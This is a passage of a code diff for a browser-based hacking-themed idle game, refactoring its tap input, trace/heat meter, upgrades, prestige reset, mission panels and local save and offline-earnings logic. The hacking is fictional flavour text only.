-      noMissionTapTimer = setTimeout(() => {
-        noMissionTapCount = 0;
-        updateTapButton();
-      }, 1200);
-    }
+// ══════════════════════════════════════════════════════
+// TAP
+// ══════════════════════════════════════════════════════
+function handleTap(){
+  if(tapCD||intState.active)return;
+  if(G.phase==='process'){
+    // During processing: tap advances pre-stage
+    if(tapPrestage())return;
     return;
   }
+  if(!G.missionRunning||!G.activeMission)return;
+  if(G.heat>=100){log('> TRACE DETECTED — lay low','err');playFail();return;}
+  tapType();
+  tapCD=true; setTimeout(()=>tapCD=false,40);
+}
 
-  if (G.heat >= 100) {
-    log('> TRACE DETECTED — wait for heat to clear', 'log-err');
-    playFail();
+function updateTapBtn(){
+  const btn=document.getElementById('tapbtn');
+  if(!G.missionRunning){btn.textContent='[ SELECT MISSION ]';btn.className='none';return;}
+  if(G.phase==='process'){
+    const t=MT.find(t=>t.id===G.activeMission);
+    const hasQueue=G.missionQueue.length>0&&PS.typed<PS.command.length;
+    btn.textContent=hasQueue?'[ TAP TO PRE-STAGE NEXT ]':`[ ${drvTag(t?.driver||'cpu')} PROCESSING... ]`;
+    btn.className=hasQueue?'':'proc';
     return;
   }
-
-  tapTypeProgress();
-
-  // Brief cooldown to prevent double-fire
-  tapCooldown = true;
-  setTimeout(() => tapCooldown = false, 50);
+  if(G.typingTier>=3){btn.textContent='[ AUTO-EXECUTING ]';btn.className='idle';return;}
+  if(G.typingTier===2){btn.textContent='[ TAP TO RUN COMMAND ]';btn.className='';return;}
+  btn.textContent=G.typingTier===1?'[ TAP TO AUTOCOMPLETE ]':'[ TAP TO TYPE ]';
+  btn.className='';
 }
 
-function updateTapButton() {
-  const btn = document.getElementById('tap-btn');
-
-  if (!G.activeMission) {
-    btn.textContent = '[ SELECT MISSION ]';
-    btn.className = 'no-mission';
-    return;
-  }
-
-  if (G.typingTier >= 3) {
-    btn.textContent = '[ AUTO-EXECUTING ]';
-    btn.className = 'idle-mode';
-    return;
-  }
-
-  if (G.typingTier === 2) {
-    btn.textContent = '[ TAP TO RUN COMMAND ]';
-    btn.className = '';
-    return;
-  }
-
-  if (G.typingTier === 1) {
-    btn.textContent = '[ TAP TO AUTOCOMPLETE ]';
-    btn.className = '';
-    return;
-  }
-
-  btn.textContent = '[ TAP TO TYPE ]';
-  btn.className = '';
+// ══════════════════════════════════════════════════════
+// AUTO TICK
+// ══════════════════════════════════════════════════════
+function startAutoTick(){
+  if(autoInt)return;
+  log('> SCHEDULER ONLINE','info');
+  autoInt=setInterval(()=>{
+    if(!G.missionRunning){autoStartBest();return;}
+    if(G.phase!=='type'||G.heat>=100)return;
+    const total=TS.command.length; if(!total)return;
+    const m=MISSIONS.find(m=>m.id===G.activeMission); if(!m)return;
+    const adv=Math.max(2,Math.floor(getBWT()*1.5));
+    TS.typed=Math.min(TS.typed+adv,total); renderCmd();
+    const pct=Math.min(100,(TS.typed/total)*100); G.missionProgress=pct; updatePct(pct);
+    addHeat((m.hPC||.02)*adv);
+    if(TS.typed>=total){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},300);}
+  },350);
 }
 
-// ════════════════════════════════════════════════
-// AUTO TICK (tier 3 idle)
-// ════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════
+// HEAT
+// ══════════════════════════════════════════════════════
+function getHeatMult(){let m=1;if((G.upgrades.lat1||0)>=1)m*=.75;if((G.upgrades.lat2||0)>=1)m*=.5;if((G.upgrades.lat3||0)>=1)m*=.25;return m;}
+function addHeat(amt){
+  G.heat=Math.min(100,G.heat+amt*getHeatMult()); updateHeatDisp();
+  if(G.heat>=100){log('> ⚠ TRACE COMPLETE — burned!','err');playFail();abortMission();G.heat=75;updateHeatDisp();}
+}
+function updateHeatDisp(){
+  const p=G.heat,f=document.getElementById('hfill');
+  f.style.width=p+'%'; document.getElementById('hpct').textContent=Math.floor(p)+'%';
+  f.style.background=p>=70?'#ff2d2d':p>=40?'#ffb700':'#00ff41';
+}
+setInterval(()=>{
+  if(G.heat<=0||intState.active)return;
+  const dm=(G.upgrades.dec1||0)>=1&&!G.missionRunning?2:1;
+  G.heat=Math.max(0,G.heat-.4*dm); updateHeatDisp();
+},500);
 
-function startAutoTick() {
-  if (autoTickInterval) return;
-  log('> SCHEDULER ONLINE — running autonomously', 'log-info');
-  autoTickInterval = setInterval(() => {
-    if (!G.missionRunning) {
-      autoStartBestMission();
-      return;
-    }
-    if (G.heat >= 100) return;
-    const mission = MISSIONS.find(m => m.id === G.activeMission);
-    if (!mission) return;
-
-    const total = typingState.command.length;
-    if (total === 0) return;
-
-    // Auto-advance chars based on BW tier, faster than manual
-    const bwMult = getBandwidthMult();
-    const charsPerTick = Math.max(1, Math.floor(bwMult * 2));
-    const newPos = Math.min(typingState.typed + charsPerTick, total);
-    typingState.typed = newPos;
-    renderCmdDisplay();
-
-    const newPct = Math.min(100, (newPos / total) * 100);
-    G.missionProgress = newPct;
-    updateProgress(newPct);
-
-    addHeat(mission.heatPerTick * 0.4 * getHeatMult());
-    updateUI();
-
-    if (newPos >= total && G.missionRunning) {
-      setTimeout(() => { if (G.missionRunning) completeMission(); }, 300);
-    }
-  }, 400);
+// ══════════════════════════════════════════════════════
+// UPGRADES
+// ══════════════════════════════════════════════════════
+function buyUpgrade(id){
+  const u=UPG.find(u=>u.id===id); if(!u)return;
+  const lvl=G.upgrades[id]||0; if(lvl>=u.mx)return;
+  if(!u.cond()){log('> Prerequisites not met.','warn');return;}
+  const cost=u.cost(lvl);
+  if(G.credits<cost){log(`> Need $${fmtNum(cost)}`,'warn');playFail();return;}
+  G.credits-=cost; G.upgrades[id]=lvl+1; u.apply();
+  log(`> INSTALLED: ${u.name}`,'ok'); playOK(); updateUI(); renderPanel('upgrades');
 }
 
-function getBandwidthMult() {
-  if (G.bandwidth >= 1000000) return 8;
-  if (G.bandwidth >= 100000) return 4;
-  if (G.bandwidth >= 10000) return 2;
-  if (G.bandwidth >= 1000) return 1.5;
-  return 1;
-}
-
-// ════════════════════════════════════════════════
-// HEAT SYSTEM
-// ════════════════════════════════════════════════
-
-function getHeatMult() {
-  let mult = 1;
-  if ((G.upgrades['vpn1']||0) >= 1) mult *= 0.75;
-  if ((G.upgrades['vpn2']||0) >= 1) mult *= 0.5;
-  return mult;
-}
-
-function addHeat(amount) {
-  G.heat = Math.min(100, G.heat + amount);
-  updateHeatDisplay();
-  if (G.heat >= 100) {
-    log('> ⚠ TRACE DETECTED — connection burned!', 'log-err');
-    playFail();
-    abortMission();
-    G.heat = 80; // partial reset
-  }
-}
-
-function updateHeatDisplay() {
-  const pct = G.heat;
-  const fill = document.getElementById('heat-fill');
-  fill.style.width = pct + '%';
-  document.getElementById('heat-pct').textContent = Math.floor(pct) + '%';
-
-  if (pct >= 70) fill.style.background = 'var(--red)';
-  else if (pct >= 40) fill.style.background = 'var(--amber)';
-  else fill.style.background = 'var(--green)';
-}
-
-// Heat decay
-setInterval(() => {
-  if (G.heat <= 0) return;
-  const decayMult = (G.upgrades['decoy1']||0) >= 1 && !G.missionRunning ? 2 : 1;
-  G.heat = Math.max(0, G.heat - 0.5 * decayMult);
-  updateHeatDisplay();
-}, 500);
-
-// ════════════════════════════════════════════════
-// UPGRADES SYSTEM
-// ════════════════════════════════════════════════
-
-function buyUpgrade(id) {
-  const upg = UPGRADES.find(u => u.id === id);
-  if (!upg) return;
-  const lvl = G.upgrades[id] || 0;
-  if (lvl >= upg.maxLevel) { log('> Already maxed.', 'log-dim'); return; }
-  if (!upg.condition()) { log('> Prerequisites not met.', 'log-warn'); return; }
-
-  const cost = upg.cost(lvl);
-  if (G.credits < cost) {
-    log(`> Insufficient credits. Need $${cost}`, 'log-warn');
-    playFail();
-    return;
-  }
-
-  G.credits -= cost;
-  G.upgrades[id] = lvl + 1;
-  upg.apply();
-
-  log(`> INSTALLED: ${upg.name}`, 'log-ok');
-  log(`> Cost: $${cost}`, 'log-dim');
-  playSuccess();
-  updateUI();
-  renderPanel('upgrades');
-}
-
-// ════════════════════════════════════════════════
-// PRESTIGE SYSTEM
-// ════════════════════════════════════════════════
-
-function canPrestige() {
-  return G.credits >= 10000 || G.missionsCompleted >= 10;
-}
-
-function doPrestige() {
-  if (!canPrestige()) return;
-  if (!confirm('BURN THIS IDENTITY?\n\nAll credits and progress lost.\nReputation multiplier increases.\n\nContinue?')) return;
-
-  const newRep = parseFloat((G.rep + 0.5).toFixed(1));
-  const count = G.prestigeCount + 1;
-
-  const aliases = ['null_byte','d3m0n','ph4ntom','zero_cool','acid_burn','c3rb3rus','h4x0r_7','spectr3'];
-  const newAlias = aliases[count % aliases.length];
-
-  // Glitch effect
-  document.getElementById('app').classList.add('glitching');
-  setTimeout(() => document.getElementById('app').classList.remove('glitching'), 400);
-
+// ══════════════════════════════════════════════════════
+// PRESTIGE
+// ══════════════════════════════════════════════════════
+function canPrestige(){return G.credits>=10000||G.missionsCompleted>=40;}
+function doPrestige(){
+  if(!canPrestige())return;
+  if(!confirm('BURN THIS IDENTITY?\n\nAll progress lost. Rep +×0.5 permanently.'))return;
+  const aliases=['null_byte','d3m0n','ph4ntom','zero_cool','acid_burn','c3rb3rus','h4x0r_7','spectr3'];
+  const newAlias=aliases[(G.prestigeCount+1)%aliases.length];
+  document.getElementById('app').classList.add('glitch');
+  setTimeout(()=>document.getElementById('app').classList.remove('glitch'),400);
   playPrestige();
-
-  // Reset
-  const savedUpgrades = {};
-  G = JSON.parse(JSON.stringify(DEFAULT_STATE));
-  G.rep = newRep;
-  G.prestigeCount = count;
-  G.alias = newAlias;
-  G.lastSeen = Date.now();
-
-  document.getElementById('alias-text').textContent = newAlias;
-  terminal.innerHTML = '';
-
-  logSep();
-  log(`> IDENTITY BURNED. REP: ×${newRep.toFixed(1)}`, 'log-warn');
-  log(`> NEW ALIAS: ${newAlias}`, 'log-ok');
-  log(`> All systems reinitializing...`, 'log-dim');
-  logSep();
-
-  updateChunkSize();
-  updateUI();
-  updateTapButton();
-  save();
+  const newRep=parseFloat((G.rep+.5).toFixed(1)),count=G.prestigeCount+1;
+  G=JSON.parse(JSON.stringify(DS));
+  G.rep=newRep; G.prestigeCount=count; G.alias=newAlias; G.lastSeen=Date.now();
+  clearInterval(autoInt); autoInt=null; clearInterval(procInt); clearInterval(cdownInt);
+  term.innerHTML=''; shownStory.clear();
+  MISSIONS=MT.map(t=>genMission(t));
+  logSep(); log(`> IDENTITY BURNED. REP: ×${newRep.toFixed(1)}`,'warn');
+  log(`> NEW ALIAS: ${newAlias}`,'ok'); logSep();
+  updateUI(); updateTapBtn(); updateHeatDisp(); save();
 }
 
-// ════════════════════════════════════════════════
-// UI RENDERING
-// ════════════════════════════════════════════════
-
-function updateUI() {
-  document.getElementById('stat-credits').textContent = formatNum(G.credits);
-  document.getElementById('stat-bw').textContent = formatBW(G.bandwidth);
-  document.getElementById('stat-rep').textContent = '×' + G.rep.toFixed(1);
-  document.getElementById('stat-runs').textContent = G.prestigeCount;
-  document.getElementById('alias-text').textContent = G.alias;
-  save();
+// ══════════════════════════════════════════════════════
+// UI
+// ══════════════════════════════════════════════════════
+function updatePct(p){document.getElementById('progfill').style.width=p+'%';document.getElementById('progpct').textContent=Math.floor(p)+'%';}
+function fmtNum(n){if(n>=1000000)return(n/1000000).toFixed(1)+'M';if(n>=1000)return(n/1000).toFixed(1)+'k';return Math.floor(n)+'';}
+function fmtBW(k){if(k>=1000000)return(k/1000000).toFixed(0)+'Gb';if(k>=1000)return(k/1000).toFixed(0)+'Mb';return k+'kb';}
+function fmtCPU(m){return m>=1000?(m/1000).toFixed(1)+'GHz':m+'MHz';}
+function updateUI(){
+  document.getElementById('s-cr').textContent=fmtNum(G.credits);
+  document.getElementById('s-bw').textContent=fmtBW(G.bandwidth);
+  document.getElementById('s-cpu').textContent=fmtCPU(G.cpu);
+  document.getElementById('s-rep').textContent='×'+G.rep.toFixed(1);
+  document.getElementById('alias-txt').textContent=G.alias;
+  updateQdisp(); updateTapBtn(); save();
+}
+function showFloat(amt){
+  const el=document.createElement('div'); el.className='cfloat'; el.textContent='+$'+fmtNum(amt);
+  const r=document.getElementById('tapbtn').getBoundingClientRect();
+  el.style.left=(r.left+r.width/2-30)+'px'; el.style.top=(r.top-10)+'px';
+  document.body.appendChild(el); setTimeout(()=>el.remove(),1200);
 }
 
-function formatNum(n) {
-  if (n >= 1000000) return (n/1000000).toFixed(1) + 'M';
-  if (n >= 1000) return (n/1000).toFixed(1) + 'k';
-  return Math.floor(n).toString();
-}
-
-function formatBW(kb) {
-  if (kb >= 1000000) return (kb/1000000).toFixed(0) + 'Gb';
-  if (kb >= 1000) return (kb/1000).toFixed(0) + 'Mb';
-  return kb + 'kb';
-}
-
-// ════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════
 // PANELS
-// ════════════════════════════════════════════════
-
-let currentPanel = 'none';
-
-function showPanel(name) {
-  const panel = document.getElementById('panel');
-  const navBtns = document.querySelectorAll('.nav-btn');
-
-  navBtns.forEach(b => b.classList.remove('active'));
-  document.getElementById('nav-terminal').classList.remove('active');
-
-  if (name === 'none' || name === currentPanel) {
-    panel.classList.remove('open');
-    currentPanel = 'none';
-    document.getElementById('nav-terminal').classList.add('active');
-    return;
-  }
-
-  currentPanel = name;
-  panel.classList.add('open');
-  document.getElementById(`nav-${name}`)?.classList.add('active');
-  document.getElementById('panel-title').textContent = name.toUpperCase();
+// ══════════════════════════════════════════════════════
+let curPanel='none';
+function showPanel(name){
+  const panel=document.getElementById('panel');
+  document.querySelectorAll('.nb').forEach(b=>b.classList.remove('act'));
+  document.getElementById('nb-terminal').classList.remove('act');
+  if(name==='none'||name===curPanel){panel.classList.remove('on');curPanel='none';document.getElementById('nb-terminal').classList.add('act');return;}
+  curPanel=name; panel.classList.add('on');
+  document.getElementById(`nb-${name}`)?.classList.add('act');
+  document.getElementById('panel-title').textContent=name.toUpperCase();
   renderPanel(name);
 }
-
-function renderPanel(name) {
-  const content = document.getElementById('panel-content');
-  content.innerHTML = '';
-
-  if (name === 'missions') renderMissions(content);
-  else if (name === 'upgrades') renderUpgrades(content);
-  else if (name === 'system') renderSystem(content);
+function renderPanel(name){
+  const c=document.getElementById('panel-content'); c.innerHTML='';
+  if(name==='missions')renderMissions(c);
+  else if(name==='upgrades')renderUpgrades(c);
+  else if(name==='system')renderSystem(c);
 }
 
-function renderMissions(container) {
-  MISSIONS.forEach(m => {
-    const locked = G.missionsCompleted < m.unlockAt;
-    const isActive = G.activeMission === m.id;
-    const card = document.createElement('div');
-    card.className = `mission-card ${locked ? 'locked' : ''} ${isActive ? 'active-mission' : ''}`;
-
-    const reward = Math.floor(m.reward.credits * G.rep);
-    card.innerHTML = `
-      <div class="mission-title">
-        ${m.name}
-        <span class="mission-type-tag ${m.type}">${m.typeTag}</span>
+function renderMissions(container){
+  MT.forEach(template=>{
+    const[minM,minC]=template.unlockAt;
+    const locked=G.missionsCompleted<minM||G.credits<minC;
+    const isActive=G.activeMission===template.id;
+    const isQueued=G.missionQueue.includes(template.id);
+    const qpos=G.missionQueue.indexOf(template.id);
+    const mission=MISSIONS.find(m=>m.id===template.id);
+    const hasIntel=!!G.knownTargets[template.id];
+    const card=document.createElement('div');
+    card.className=`mc ${locked?'locked':''} ${isActive?'active-m':''} ${isQueued?'queued':''} ${hasIntel&&!locked?'intel':''}`;
+    const reward=Math.floor(template.reward.base*G.rep*(1+G.missionsCompleted*.06));
+    const psecs=Math.ceil(getProcSecs(template));
+    let lockMsg='';
+    if(G.missionsCompleted<minM)lockMsg=`🔒 Complete ${minM} missions`;
+    else if(G.credits<minC)lockMsg=`🔒 Need $${fmtNum(minC)}`;
+    card.innerHTML=`
+      <div class="mtitle">${template.name}<span class="mtag ${template.type}">${template.typeTag}</span></div>
+      ${isQueued?`<span class="qbadge">QUEUE #${qpos+1}</span>`:''}
+      ${hasIntel&&!locked?'<span class="intel-badge">INTEL ★</span>':''}
+      <div class="mdesc">${locked?lockMsg:(mission?.desc||'')}</div>
+      <div class="mmeta">
+        <span>~$<span class="v">${fmtNum(reward)}</span></span>
+        <span>PROC:<span class="v">~${psecs}s</span></span>
+        <span>TRACE:<span class="v">${template.hOC}%</span></span>
+        ${isActive?'<span class="v">► ACTIVE</span>':''}
+        ${hasIntel&&!locked?'<span style="color:#ffb700">⚡ BONUS</span>':''}
       </div>
-      <div class="mission-desc">${locked ? `🔒 Complete ${m.unlockAt} missions to unlock` : m.desc}</div>
-      <div class="mission-meta">
-        <span>REWARD: <span class="val">$${formatNum(reward)}</span></span>
-        <span>TRACE: <span class="val">${m.heatOnComplete}%</span></span>
-        ${isActive ? '<span class="val">► ACTIVE</span>' : ''}
-      </div>
-    `;
-    if (!locked && !isActive) card.onclick = () => selectMission(m.id);
+      <div class="pbar-row"><span class="pbar-lbl">${drvTag(template.driver)}</span><div class="pbar-trk"><div class="pbar-fill" style="width:${Math.min(100,100/Math.max(psecs,1)*8)}%"></div></div></div>`;
+    if(!locked&&!isActive&&!isQueued)card.onclick=()=>selectMission(template.id);
+    else if(!locked&&isQueued)card.onclick=()=>{G.missionQueue=G.missionQueue.filter(id=>id!==template.id);updateQdisp();renderPanel('missions');log(`> Dequeued: ${template.name}`,'dim');};
     container.appendChild(card);
   });
-
-  if (G.missionRunning) {
-    const abortBtn = document.createElement('button');
-    abortBtn.style.cssText = 'margin:10px 12px;padding:10px;width:calc(100% - 24px);background:transparent;border:1px solid var(--red);color:var(--red);font-family:Share Tech Mono,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:4px;';
-    abortBtn.textContent = '[ ABORT CURRENT MISSION ]';
-    abortBtn.onclick = () => { abortMission(); showPanel('none'); };
-    container.appendChild(abortBtn);
+  if(G.missionRunning){
+    const ab=document.createElement('button');
+    ab.style.cssText='margin:10px;padding:10px;width:calc(100% - 20px);background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:Share Tech Mono,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:4px;-webkit-appearance:none;';
+    ab.textContent='[ ABORT MISSION ]';
+    ab.onclick=()=>{G.missionQueue=[];updateQdisp();abortMission();showPanel('none');};
+    container.appendChild(ab);
+  }
+  if(G.maxQueueSize>1){
+    const info=document.createElement('div');
+    info.style.cssText='margin:8px 10px;padding:8px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
+    info.textContent=`Queue: ${G.missionQueue.length+(G.missionRunning?1:0)}/${G.maxQueueSize}. Tap to add/remove.`;
+    container.appendChild(info);
+  }
+  // Intel section
+  const intelKeys=Object.keys(G.knownTargets);
+  if(intelKeys.length>0){
+    const sec=document.createElement('div');
+    sec.style.cssText='margin:8px 10px;padding:8px;border:1px solid #2a2200;border-radius:4px;font-size:10px;color:#4a7a4a;background:rgba(255,183,0,.03);';
+    sec.innerHTML=`<div style="color:#ffb700;margin-bottom:4px;letter-spacing:2px;">// TARGET INTEL</div>${intelKeys.map(id=>{const t=MT.find(t=>t.id===id);const intel=G.knownTargets[id];return`<div>${t?t.name:id}: <span style="color:#00ff41">${intel.ip}</span></div>`;}).join('')}`;
+    container.appendChild(sec);
   }
 }
 
-function renderUpgrades(container) {
-  let lastSection = '';
-  UPGRADES.forEach(upg => {
-    if (!upg.condition()) return;
-
-    if (upg.section !== lastSection) {
-      lastSection = upg.section;
-      const sec = document.createElement('div');
-      sec.className = 'upgrade-section';
-      sec.textContent = '// ' + upg.section;
-      container.appendChild(sec);
-    }
-
-    const lvl = G.upgrades[upg.id] || 0;
-    const maxed = lvl >= upg.maxLevel;
-    const cost = maxed ? 0 : upg.cost(lvl);
-    const canAfford = G.credits >= cost;
-
-    const card = document.createElement('div');
-    card.className = `upgrade-card ${maxed ? 'maxed' : ''} ${!canAfford && !maxed ? 'cant-afford' : ''}`;
-    card.innerHTML = `
-      <div class="upgrade-info">
-        <div class="upgrade-name">${upg.name}</div>
-        <div class="upgrade-desc">${upg.desc}</div>
-      </div>
-      <div class="upgrade-cost">
-        ${maxed
-          ? '<span style="color:var(--green-dim)">INSTALLED</span>'
-          : `<div class="cost-val">$${formatNum(cost)}</div>`
-        }
-      </div>
-    `;
-    if (!maxed) card.onclick = () => buyUpgrade(upg.id);
+function renderUpgrades(container){
+  let lastSec='';
+  UPG.forEach(u=>{
+    if(!u.cond())return;
+    if(u.sec!==lastSec){lastSec=u.sec;const s=document.createElement('div');s.className='usec';s.textContent='// '+u.sec;container.appendChild(s);}
+    const lvl=G.upgrades[u.id]||0,maxed=lvl>=u.mx,cost=maxed?0:u.cost(lvl),canAfford=G.credits>=cost;
+    const card=document.createElement('div');
+    card.className=`uc ${maxed?'maxed':''} ${!canAfford&&!maxed?'broke':''}`;
+    card.innerHTML=`<div class="uinfo"><div class="uname">${u.name}</div><div class="udesc">${u.desc}</div></div><div class="ucost">${maxed?'<span style="color:#00aa2a">INSTALLED</span>':`<div class="cv">$${fmtNum(cost)}</div>`}</div>`;
+    if(!maxed)card.onclick=()=>buyUpgrade(u.id);
     container.appendChild(card);
   });
 }
 
-function renderSystem(container) {
-  container.innerHTML = `
-    <div id="rep-display">
-      REPUTATION MULTIPLIER<br>
-      <span class="rep-val">×${G.rep.toFixed(1)}</span>
+function renderSystem(container){
+  const intelCount=Object.keys(G.knownTargets).length;
+  container.innerHTML=`
+    <div id="repdisp">REPUTATION<br><span class="rv">×${G.rep.toFixed(1)}</span></div>
+    <div id="pressec">
+      <div id="prestitle">// BURN IDENTITY</div>
+      <div id="presdesc">Wipe alias, credits, upgrades.<br>Keep <span style="color:#ffb700">Reputation</span> (+×0.5 forever).<br><br>Req: $10,000 or 40 missions.<br>Missions: <span style="color:#00ff41">${G.missionsCompleted}</span></div>
+      <button id="presbtn" onclick="doPrestige()" ${canPrestige()?'':'disabled'}>[ BURN THIS IDENTITY ]</button>
     </div>
-    <div id="prestige-section">
-      <div id="prestige-title">// BURN IDENTITY</div>
-      <div id="prestige-desc">
-        Wipe your alias, credits, and progress.<br>
-        Keep your <span style="color:var(--amber)">Reputation multiplier</span> (+×0.5).<br>
-        All rewards scale permanently.<br><br>
-        Requirement: $10,000+ or 10 missions completed.<br>
-        Missions completed: <span style="color:var(--green)">${G.missionsCompleted}</span>
-      </div>
-      <button id="prestige-btn" onclick="doPrestige()" ${canPrestige() ? '' : 'disabled'}>
-        [ BURN THIS IDENTITY ]
-      </button>
-    </div>
-    <div style="margin:12px;padding:12px;border:1px solid var(--border);border-radius:4px;background:var(--bg);font-size:10px;color:var(--text-dim);">
-      <div style="color:var(--green-dim);margin-bottom:8px;letter-spacing:2px;">// SYSTEM INFO</div>
-      <div>Version: 0.1.0-mvp</div>
-      <div>Prestige Runs: ${G.prestigeCount}</div>
-      <div>Total Missions: ${G.missionsCompleted}</div>
-      <div>Current Alias: ${G.alias}</div>
-      <div style="margin-top:8px;"><button onclick="if(confirm('Reset ALL data?')){localStorage.removeItem('${SAVE_KEY}');location.reload();}" style="background:none;border:1px solid var(--border);color:var(--text-dim);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px 8px;cursor:pointer;border-radius:2px;">WIPE SAVE</button></div>
-    </div>
-  `;
+    <div style="margin:10px;padding:12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;line-height:1.8;">
+      <div style="color:#00aa2a;margin-bottom:6px;letter-spacing:2px;">// HARDWARE</div>
+      <div>Bandwidth: ${fmtBW(G.bandwidth)}/s</div>
+      <div>CPU: ${fmtCPU(G.cpu)}</div>
+      <div>RAM: ${G.ram>=1024?(G.ram/1024).toFixed(0)+'GB':G.ram+'MB'}</div>
+      <div>Latency: ${G.latency}ms</div>
+      <div>Target Intel: ${intelCount} known targets</div>
+      <div>Interrupt fails: ${G.interruptFails||0} (resets per mission)</div>
+      <div>Prestige runs: ${G.prestigeCount}</div>
+      <div style="margin-top:8px;"><button onclick="if(confirm('Wipe all?')){localStorage.removeItem('${SK}');location.reload();}" style="background:none;border:1px solid #1a3a1a;color:#4a7a4a;font-family:Share Tech Mono,monospace;font-size:10px;padding:4px 8px;cursor:pointer;border-radius:2px;-webkit-appearance:none;">WIPE SAVE</button></div>
+    </div>`;
 }
 
-// ════════════════════════════════════════════════
-// CREDIT FLOAT FX
-// ════════════════════════════════════════════════
-
-function showCreditFloat(amount) {
-  const el = document.createElement('div');
-  el.className = 'credit-flash';
-  el.textContent = '+$' + formatNum(amount);
-  const btn = document.getElementById('tap-btn');
-  const rect = btn.getBoundingClientRect();
-  el.style.left = (rect.left + rect.width/2 - 30) + 'px';
-  el.style.top = (rect.top - 10) + 'px';
-  document.body.appendChild(el);
-  setTimeout(() => el.remove(), 1200);
+// ══════════════════════════════════════════════════════
+// SAVE / LOAD / OFFLINE
+// ══════════════════════════════════════════════════════
+function save(){G.lastSeen=Date.now();localStorage.setItem(SK,JSON.stringify(G));}
+function load(){
+  const raw=localStorage.getItem(SK); if(!raw)return false;
+  try{G=Object.assign(JSON.parse(JSON.stringify(DS)),JSON.parse(raw));return true;}catch(e){return false;}
 }
-
-// ════════════════════════════════════════════════
-// SAVE / LOAD
-// ════════════════════════════════════════════════
-
-function save() {
-  G.lastSeen = Date.now();
-  localStorage.setItem(SAVE_KEY, JSON.stringify(G));
+function calcOff(secs){
+  if(secs<30)return null;
+  const mins=Math.min(Math.floor(secs/60),480);
+  const t=MT[Math.min(Math.floor(G.missionsCompleted/10),MT.length-1)];
+  const earned=Math.floor(t.reward.base*G.rep/2*mins*.25);
+  return{mins,earned};
 }
-
-function load() {
-  const raw = localStorage.getItem(SAVE_KEY);
-  if (!raw) return false;
-  try {
-    const saved = JSON.parse(raw);
-    G = Object.assign(JSON.parse(JSON.stringify(DEFAULT_STATE)), saved);
-    return true;
-  } catch(e) { return false; }
+function showOffModal(g){
+  if(!g||g.earned<=0)return;
+  G.credits+=g.earned;
+  document.getElementById('offlog').innerHTML=`<div>Away: <span class="hi">${g.mins}min</span></div><div>Passive: <span class="hi">+$${fmtNum(g.earned)}</span></div>`;
+  document.getElementById('offmod').classList.add('on');
 }
+function closeOff(){document.getElementById('offmod').classList.remove('on');updateUI();}
 
-// ════════════════════════════════════════════════
-// OFFLINE GAINS
-// ════════════════════════════════════════════════
-
-function calcOfflineGains(secondsAway) {
-  if (secondsAway < 10) return null;
-  const mins = Math.floor(secondsAway / 60);
-  const cappedMins = Math.min(mins, 480); // 8hr cap
-
-  // Base rate: estimate credits/min from last mission tier
-  const missionIdx = Math.min(Math.floor(G.missionsCompleted / 2), MISSIONS.length - 1);
-  const baseMission = MISSIONS[missionIdx];
-  const credPerMin = (baseMission.reward.credits * G.rep) / 3;
-  const earned = Math.floor(credPerMin * cappedMins * 0.3); // 30% efficiency offline
-
-  return { mins: cappedMins, earned };
-}
-
-function showOfflineModal(gains) {
-  if (!gains || gains.earned <= 0) return;
-  G.credits += gains.earned;
-
-  const logEl = document.getElementById('offline-log');
-  logEl.innerHTML = `
-    <div>Time away: <span class="hi">${gains.mins} min</span></div>
-    <div>Passive credits earned: <span class="hi">+$${formatNum(gains.earned)}</span></div>
-    <div style="margin-top:8px;color:#2a4a2a;">// Botnet nodes kept running.</div>
-    <div style="color:#2a4a2a;">// Logs compressed for review.</div>
-  `;
-  document.getElementById('offline-modal').classList.add('show');
-}
-
-function closeOfflineModal() {
-  document.getElementById('offline-modal').classList.remove('show');
-  updateUI();
-}
-
-// ════════════════════════════════════════════════
-// BOOT SEQUENCE
-// ════════════════════════════════════════════════
-
-const bootLines = [
-  'HACKNODE OS v0.1.0',
-  'Loading kernel modules...',
-  'Initializing network stack...',
-  'Mounting virtual filesystem...',
-  'Starting anonymization layer...',
-  'System ready.',
-];
-
-async function boot() {
-  const bootStatus = document.getElementById('boot-status');
-  const bootScreen = document.getElementById('boot-screen');
-
-  const hasSave = load();
-
-  for (const line of bootLines) {
-    bootStatus.textContent = line;
-    await delay(280);
-  }
-
-  await delay(400);
-  bootScreen.style.transition = 'opacity 0.5s';
-  bootScreen.style.opacity = '0';
-  await delay(500);
-  bootScreen.style.display = 'none';
-
-  // Restore state
-  if (hasSave) {
-    const secondsAway = Math.floor((Date.now() - G.lastSeen) / 1000);
-    const gains = calcOfflineGains(secondsAway);
-
-    updateChunkSize();
-    if (G.typingTier >= 3) startAutoTick();
-
-    // Restore active mission display
-    G.missionRunning = false;
-    G.activeMission = null;
-
-    updateUI();
-    updateTapButton();
-    updateHeatDisplay();
-
-    log('> Connection restored.', 'log-dim');
-    log(`> Welcome back, ${G.alias}`, 'log-ok');
-    if (G.missionsCompleted > 0) {
-      log(`> ${G.missionsCompleted} missions on record.`, 'log-dim');
-    }
-
-    if (gains) showOfflineModal(gains);
-  } else {
-    // First run
-    updateUI();
-    updateTapButton();
-    await introSequence();
+// ══════════════════════════════════════════════════════
+// BOOT
+// ══════════════════════════════════════════════════════
+async function boot(){
+  const status=document.getElementById('bootstatus'),screen=document.getElementById('boot');
+  const hasSave=load();
+  for(const line of['HACKNODE OS v0.3.0','Loading kernel modules...','Network stack ready...','Anonymization layer: ACTIVE','System ready.']){status.textContent=line;await delay(250);}
+  await delay(300);
+  screen.style.transition='opacity .5s'; screen.style.opacity='0';
+  await delay(500); screen.style.display='none';
+  if(hasSave){
+    G.missionRunning=false; G.phase=null; G.activeMission=null;
+    if(!G.missionQueue)G.missionQueue=[];
+    if(!G.knownTargets)G.knownTargets={};
+    if(G.typingTier>=3)startAutoTick();
+    updateUI(); updateTapBtn(); updateHeatDisp();
+    log('> Connection restored.','dim');
+    log(`> Welcome back, ${G.alias}`,'ok');
+    if(G.missionsCompleted>0)log(`> ${G.missionsCompleted} missions. ${Object.keys(G.knownTargets).length} known targets.`,'dim');
+    const g=calcOff(Math.floor((Date.now()-G.lastSeen)/1000));
